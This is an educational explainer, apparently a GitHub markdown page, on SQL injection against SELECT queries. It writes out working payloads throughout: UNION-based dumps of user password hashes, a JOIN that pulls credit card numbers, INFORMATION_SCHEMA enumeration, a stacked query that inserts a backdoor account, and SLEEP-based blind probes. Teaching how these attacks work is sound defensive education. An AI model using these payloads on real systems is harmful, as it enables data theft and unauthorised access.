<img width="680" height="520" alt="union_join_injection_diagram (1)" src="https://github.com/user-attachments/assets/663d2edb-06d7-452e-bc53-b0a717c0c101" />

### Why SELECT is the Most Dangerous Target

Almost every web app constantly runs SELECT queries — search boxes, login forms, profile pages, product listings. Since SELECT is everywhere, it's the biggest attack surface.

```sql
-- Every page load triggers SELECTs like these:
SELECT * FROM products WHERE name = '[USER INPUT]';
SELECT * FROM users WHERE id = '[USER INPUT]';
SELECT * FROM posts WHERE category = '[USER INPUT]';
```

Every one of these is a potential injection point.

---

## The UNION Attack — Connecting Tables Together

This is the **most powerful** advanced injection technique. UNION allows an attacker to **join the results of two SELECT statements** — meaning they can pull data from a completely different table and make it appear in the normal page output.

### How UNION Works Normally

```sql
-- Combines results from two tables into one result set
SELECT product_name, price FROM products
UNION
SELECT username, password FROM users;
```

### How an Attacker Exploits It

Imagine a search box on a shopping site. Normal query:

```sql
SELECT name, price FROM products WHERE name = 'laptop';
```

Attacker types this in the search box:

```
' UNION SELECT username, password FROM users--
```

App builds:

```sql
SELECT name, price FROM products WHERE name = ''
UNION
SELECT username, password FROM users--;
```

**Result shown on the webpage:**

```
Products found:
─────────────────────────────
admin          | $2a$10$hashed...
alice          | $2a$10$hashed...
john           | $2a$10$hashed...
```

The attacker just **dumped the entire users table** through a product search box.

---

## Rules UNION Must Follow (and How Attackers Work Around Them)

UNION has strict rules — both SELECT statements must have the **same number of columns** and **compatible data types**.

### Step 1 — Find column count using ORDER BY

```sql
' ORDER BY 1--   ✅ works
' ORDER BY 2--   ✅ works
' ORDER BY 3--   ✅ works
' ORDER BY 4--   ❌ error → table has 3 columns
```

### Step 2 — Find which columns are visible on screen

```sql
' UNION SELECT 'A','B','C'--
```

If the page shows `A` and `C` but not `B`, columns 1 and 3 are visible output columns. The attacker now knows exactly where to inject extracted data.

### Step 3 — Extract real data

```sql
' UNION SELECT username, password, email FROM users--
```

---

## The JOIN Attack — Exploiting Table Relationships

The paragraph mentions **putting different tables in relation** — this is the relational model's JOIN feature, which attackers can also abuse.

### Normal JOIN (how developers use it)

```sql
-- Link orders to customers via shared customer_id
SELECT customers.name, orders.total
FROM customers
JOIN orders ON customers.id = orders.customer_id;
```

### Attacker Abusing JOIN via Injection

In a search field the attacker injects:

```sql
' UNION SELECT u.username, c.card_number
FROM users u
JOIN credit_cards c ON u.id = c.user_id--
```

This **crosses two private tables** — users and credit cards — and outputs linked data together. The attacker gets not just usernames but the matching credit card for each user in one shot.

------

## Other Advanced SQL Commands Attackers Abuse

Beyond UNION and JOIN, here are the other powerful commands that make injection dangerous:

### INFORMATION_SCHEMA — The Database's Own Map

MySQL has a built-in hidden database that lists every table and column name. An attacker can query it:

```sql
' UNION SELECT table_name, column_name, 3 FROM information_schema.columns--
```

This returns a complete **map of your entire database** — every table name, every column name. The attacker now knows exactly what to target next without guessing.

### Stacked Queries — Running Multiple Commands

Some databases (SQL Server, PostgreSQL) allow multiple statements separated by `;`:

```sql
'; INSERT INTO users (username, password) VALUES ('hacker','pass123'); --
```

This creates a **backdoor admin account** silently while the original query still runs.

### SLEEP / BENCHMARK — Blind Injection

When the page shows no output, attackers use time delays to confirm vulnerability:

```sql
' OR SLEEP(5)--
```

If the page takes 5 seconds to load → injection confirmed, even with no visible output.

---

## Why the Relational Model Makes This Worse

The paragraph hints at something important — the **strength** of relational databases (linking tables via shared keys) becomes a **weakness** under injection. A single vulnerable search box can chain across the entire database through JOIN and UNION, because all tables are already connected by design. The attacker doesn't break the database — they simply exploit its own relationship structure against itself.
